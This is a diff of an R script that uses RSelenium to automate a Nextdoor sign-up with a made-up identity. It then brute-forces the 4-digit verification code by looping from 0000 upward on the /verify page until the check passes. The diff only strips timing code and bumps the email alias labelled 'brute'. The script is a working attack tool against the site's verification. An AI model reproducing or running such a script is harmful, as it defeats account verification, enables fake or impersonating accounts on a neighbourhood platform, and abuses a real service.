@@ -1,17 +1,12 @@
 library(RSelenium)
 library(rvest)
 library(dplyr)
-library(timeR)                                    #to time my program
-
-timer1 = createTimer(precision = "ms")
-timer2 = createTimer(precision = "ms")
-timer1$start("full")
 
 rD = rsDriver(browser="firefox", port=4544L, verbose=F)                
 remDr = rD[["client"]]
 remDr$navigate("https://nextdoor.com/")
 
-email = "bdaa.nextdoor+brute3@gmail.com"
+email = "bdaa.nextdoor+brute4@gmail.com"
 address = "156 E 13th"
 fName = "Jane"
 lName = "Hardy"
@@ -44,8 +39,6 @@ Sys.sleep(4)
 url = remDr$getCurrentUrl()
 num = 0000
 
-timer2$start("loop")
-
 while (url == "https://nextdoor.com/verify"){
   num = toString(formatC(num, width=4, flag="0"))
   remDr$findElement(using = "id", value = "1")$clearElement()
@@ -55,11 +48,6 @@ while (url == "https://nextdoor.com/verify"){
   num = as.double(num)
   num = num +1
 }
-
-timer1$stop("full")
-timer2$stop("loop")
-getTimer(timer1)
-getTimer(timer2)
 
 
 remDr$close()
